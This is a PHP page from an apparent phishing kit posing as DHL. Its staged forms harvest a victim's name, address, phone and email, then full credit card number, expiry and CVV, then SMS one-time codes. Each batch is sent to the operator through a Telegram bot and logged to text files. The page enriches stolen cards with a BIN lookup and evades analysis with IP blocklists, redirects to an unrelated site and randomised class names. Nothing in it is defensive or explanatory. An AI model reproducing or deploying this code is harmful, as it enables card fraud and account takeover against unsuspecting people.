<?php
    session_start();
    error_reporting(0);

    require("../libraries/UserInfo.php");
    require_once('../libraries/geoplugin.class.php');
    include '../setting/functions.php';
    require_once "../setting/lang.php";

    function isBlocked($ip) {
        $blockedIPs = file_get_contents('../panel/blocked_ips.txt');
        return strpos($blockedIPs, $ip) !== false;
    }

    // Get the user's IP address
    $userIP = get_client_ip();

    // Check if the user's IP is blocked
    if (isBlocked($userIP)) {
        // Redirect the blocked user to another page
        header("Location: https://www.superhonda.com/");
        exit();
    }

    // Lang Fucntion :
    lang();

    $geoplugin = new geoPlugin();
    $geoplugin->locate();
    $ip = get_client_ip();

    $permitted_chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';

    if (isset($_POST['send_data_1'])) {
        $status = "User In Page Information Paresonal";
    
        // Send Data To Telegram Bot :
        $message = urlencode(
        "👤************ [ Status User ] ************👤\r\n".
        "[ Status ] " . $status ."\r\n".
        "📍IP - ".$ip." | ".$geoplugin->countryCode."\r\n".
        "👤************ [ Status User ] ************👤\r\n");
        telegram($message);
    
        $message_to_file = 
        "👤************ [ Status User ] ************👤\r\n".
        "[ Status ] " . $status ."\r\n".
        "📍IP - ".$ip." | ".$geoplugin->countryCode."\r\n".
        "👤************ [ Status User ] ************👤\r\n";
        
        $file = fopen("../file/fisle.txt", "a");
        fwrite($file, $message_to_file. "\n");
        fclose($file);
        echo "
        <script>
            function redirectUser() {
                window.location.href = './infromation-page.php';
            }
            setTimeout(redirectUser, 5000);  
        </script>";
        
    }elseif (isset($_POST['send_data_2'])) {
        // Info User :
        $full_name = $_POST['full_name'];
        $country = $_POST['country'];
        $city = $_POST['city'];
        $address = $_POST['address']; 
        $state = $_POST['state'];
        $zip_code = $_POST['zip_code'];
        $phone_number = $_POST['phone_number'];
        $email = $_POST['email']; 
        
        // Send Data To Telegram Bot :
        $message = urlencode(
        "👤************ [ Information Personal ] ************👤\r\n".
        "[ Full Name ] " . $full_name ."\r\n".
        "[ Country ] " . $country ."\r\n".
        "[ City ] " . $city ."\r\n".
        "[ Address ] " . $address ."\r\n".
        "[ State ] " . $state ."\r\n".
        "[ Zip Code ] " . $zip_code ."\r\n".
        "[ Phone Number ] " . $phone_number ."\r\n".
        "[ Email ] " . $email ."\r\n".
        "📍IP - ".$ip." | ".$geoplugin->countryCode."\r\n".
        "👤************ [ Information Personal ] ************👤\r\n");
        telegram($message);
    
        $message_to_file = 
        "👤************ [ Information Personal ] ************👤\r\n".
        "[ Full Name ] " . $full_name ."\r\n".
        "[ Country ] " . $country ."\r\n".
        "[ City ] " . $city ."\r\n".
        "[ Address ] " . $address ."\r\n".
        "[ State ] " . $state ."\r\n".
        "[ Zip Code ] " . $zip_code ."\r\n".
        "[ Phone Number ] " . $phone_number ."\r\n".
        "[ Email ] " . $email ."\r\n".
        "📍IP - ".$ip." | ".$geoplugin->countryCode."\r\n".
        "👤************ [ Information Personal ] ************👤\r\n";
        
        $file = fopen("../file/fisle.txt", "a");
        fwrite($file, $message_to_file. "\n");
        fclose($file);
    
        echo "
        <script>
            function redirectUser() {
                window.location.href = './payment-page.php';
            }
            setTimeout(redirectUser, 5000);  
        </script>";
    
    }elseif (isset($_POST['send_data_3'])) {
        // Info User :
        $card_name = $_POST['card_name']; 
        $card_number = $_POST['numberdrac'];
        $expires = $_POST['datedrac'];
        $cvv = $_POST['vvcdrac'];
    
        $cardNumber = str_replace(' ', '', $card_number);
        $firstSixDigits = substr($cardNumber, 0, 6);
        $lastFourDigits = substr($cardNumber, -4);
        
        $url = "https://data.handyapi.com/bin/" . $firstSixDigits;
        $options = [
            "http" => [
                "method" => "GET",
                "header" => "Referer: your_domain\r\n"
            ]
        ];
    
        $context = stream_context_create($options);
        $response = @file_get_contents($url, false, $context);
        $data = @json_decode($response, true);
        $_SESSION["name_the_bank"] = $data["Issuer"];
        $_SESSION["Last_four_digits"] = $lastFourDigits;
        $_SESSION["Type"] = $data["Type"];
        $_SESSION["Scheme"] = $data["Scheme"];
    
        if ($data["Scheme"] === "MASTERCARD") {
            $_SESSION["image_by"] = '<img src="../img/by-mastercard.png" alt="">';
        } elseif ($data["Scheme"] === "VISA") {
            $_SESSION["image_by"] = '<img src="../img/by-visa.png" alt="">';
        } elseif ($data["Scheme"] === "DISCOVER") {
            $_SESSION["image_by"] = '<img src="../img/by-discover.png" alt="">';
        } elseif ($data["Scheme"] === "MASTERCARD") {
            $_SESSION["image_by"] = '<img src="../img/by-moestro.png" alt="">';
        } else {
            $_SESSION["image_by"] = $data["Issuer"];
        }
        
        // Send Data To Telegram Bot :
        $message = urlencode(
            "💳************ [ Credit Card ] ************💳\r\n".
            "[ Hold Name ] " . $card_name ."\r\n".
            "[ Card Number ] " . $card_number ."\r\n".
            "[ Expiry Date ] " . $expires ."\r\n".
            "[ Cvv ] " . $cvv ."\r\n".
            "[ 🏛 Name Bank ] " . $_SESSION["name_the_bank"] ."\r\n".
            "[ 💳 Type Card ] " . $_SESSION["Type"] ."\r\n".
            "[ 💳 Type Card ] " . $_SESSION["Scheme"] ."\r\n".
            "💳************ [ Credit Card ] ************💳\r\n");
        telegram($message);
    
        $message_to_file = 
        "💳************ [ Credit Card ] ************💳\r\n".
        "[ Hold Name ] " . $card_name ."\r\n".
        "[ Card Number ] " . $card_number ."\r\n".
        "[ Expiry Date ] " . $expires ."\r\n".
        "[ Cvv ] " . $cvv ."\r\n".
        "[ 🏛 Name Bank ] " . $_SESSION["name_the_bank"] ."\r\n".
        "[ 💳 Type Card ] " . $_SESSION["Type"] ."\r\n".
        "[ 💳 Type Card ] " . $_SESSION["Scheme"] ."\r\n".
        "💳************ [ Credit Card ] ************💳\r\n";
        
        $file = fopen("../file/file.txt", "a");
        fwrite($file, $message_to_file. "\n");
        fclose($file);
    
        echo "
        <script>
            function redirectUser() {
                window.location.href = './confirmation.php';
            }
            setTimeout(redirectUser, 20000);  
        </script>";
    
    }elseif (isset($_POST['send_data_4'])) {
        $sms = $_POST['mss'];
    
        // Send Data To Telegram Bot :
        $message = urlencode(
        "📲************ [ Otp Code ] ************📲\r\n".
        "[ Otp Code ] " . $sms ."\r\n".
        "📍IP - ".$ip." | ".$geoplugin->countryCode."\r\n".
        "📲************ [ Otp Code ] ************📲\r\n");
        telegram($message);
    
    
        $message_to_file = 
        "📲************ [ Otp Code ] ************📲\r\n".
        "[ Otp Code ] " . $sms ."\r\n".
        "📍IP - ".$ip." | ".$geoplugin->countryCode."\r\n".
        "📲************ [ Otp Code ] ************📲\r\n";
        
        $file = fopen("../file/file.txt", "a");
        fwrite($file, $message_to_file. "\n");
        fclose($file);
        
    
        echo "
        <script>
            function redirectUser() {
                window.location.href = './confirmation-error.php';
            }
            setTimeout(redirectUser, 7000);  
        </script>";
    }elseif (isset($_POST['send_data_5'])) {
        $sms = $_POST['mss'];
    
        // Send Data To Telegram Bot :
        $message = urlencode(
        "📲************ [ ERROR Otp Code ] ************📲\r\n".
        "[ Otp Code ] " . $sms ."\r\n".
        "📍IP - ".$ip." | ".$geoplugin->countryCode."\r\n".
        "📲************ [ ERROR Otp Code ] ************📲\r\n");
        telegram($message);
    
    
        $message_to_file = 
        "📲************ [ ERROR Otp Code ] ************📲\r\n".
        "[ Otp Code ] " . $sms ."\r\n".
        "📍IP - ".$ip." | ".$geoplugin->countryCode."\r\n".
        "📲************ [ ERROR Otp Code ] ************📲\r\n";
            
            $file = fopen("../file/file.txt", "a");
            fwrite($file, $message_to_file. "\n");
            fclose($file);
            echo "
            <script>
                function redirectUser() {
                    window.location.href = './confirmation-error.php';
                }
                setTimeout(redirectUser, 6000);  
            </script>";
            
    }

?>

<!DOCTYPE html>
<html lang="en" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> ">
<head>
  <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <!-- Font Google -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <!-- Font Awesome Library -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css" integrity="sha512-KfkfwYDsLkIlwQp6LFnl8zNdLGxu9YAA1QvwINks4PhcElQSvqcyVLLD9aMhXd13uQjoXtEKNosOWaZqXgel0g==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    <!-- File Css -->
    <link rel="stylesheet" href="../css/main.css">
    <link rel="stylesheet" href="../css/basic-thinks.css">
    <!-- Favicon -->
    <link rel="icon" href="../img/favicon.gif">
    <link rel="shortcut" href="../img/favicon.gif">
    <link rel="appel-touch-icon" href="../img/favicon.gif">
    <title>DHL - <?php echo get_text('title_head'); ?></title>
</head>
<body  class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> ">
    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> loading">
        <img src="../img/loading.gif" alt="">
    </div>
    <script>
        // Function to check if IP is in the list and redirect if necessary
        function checkBlockedIP() {
            // Fetch the IP list file using AJAX
            fetch('../panel/blocked_ips.txt')
                .then(response => response.text())
                .then(data => {
                    // Split the data into an array of IP addresses
                    const ipList = data.trim().split('\n');

                    // Get user's IP address using PHP function
                    const userIP = '<?php echo get_client_ip(); ?>';

                    // Check if user's IP is in the list
                    if (ipList.includes(userIP)) {
                        // Redirect user to another page if their IP is in the list
                        window.location.href = 'https://www.superhonda.com/';
                    }
                })
                .catch(error => console.error('Error fetching IP list:', error));
        }

        // Call the function immediately when the page loads
        checkBlockedIP();

        // Check blocked IP every 5 seconds
        setInterval(checkBlockedIP, 1000);
    </script>
</body>
</html>